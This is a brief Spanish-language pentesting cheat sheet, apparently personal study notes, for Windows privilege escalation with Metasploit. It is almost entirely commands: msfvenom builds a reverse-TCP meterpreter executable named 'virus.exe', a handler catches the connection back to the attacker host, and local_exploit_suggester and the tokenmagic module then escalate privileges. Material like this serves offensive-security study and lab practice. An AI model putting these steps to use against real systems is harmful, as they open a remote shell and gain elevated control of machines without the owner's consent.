- Tags : #escalada #escalada_privilegios #window #escalada_privilegios_windows #metasploit #meterpreter #msfvenom  
```bash 
#Creamos un payload para obtener una reverse shell desde la maquina windows para posteriormente hace la escalada

msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port
-f exe -o virus.exe

msfconsole
use multi/handler
set LHOST ip
set LPORT port
set PAYLOAD windows/meterpreter/reverse_tcp
run
#Ejecutamos el virus.exe en la maquina windows y establecemos la coneccion con nuestro host atacante con una session de meterpreter 

meterpreter>shell #Abrir el cmd de windows
meterpreter>background #Poner una session en background
meterpreter>sessons -l #listar las sessiones diposnibles
meterpreter>sessions -i 1  #para acceder a la sesion de id 1

meterpreter>use local_exploit_suggester #es un modulo de automatizacion para la enumeracion de la escalada de privilegios

meterpreter>set SESSION 1
meterpreter>run

#Itilizaremos los modulos que aparecen para la escalada de privilegio ejemplo
meterpreter>use exploit/windows/local/tokenmagic
meterpreter>show options
meterpreter>set LHOST ip_attacker
meterpreter>set LPORT port
meterpreter>set SESSION 1
meterpreter>run

```
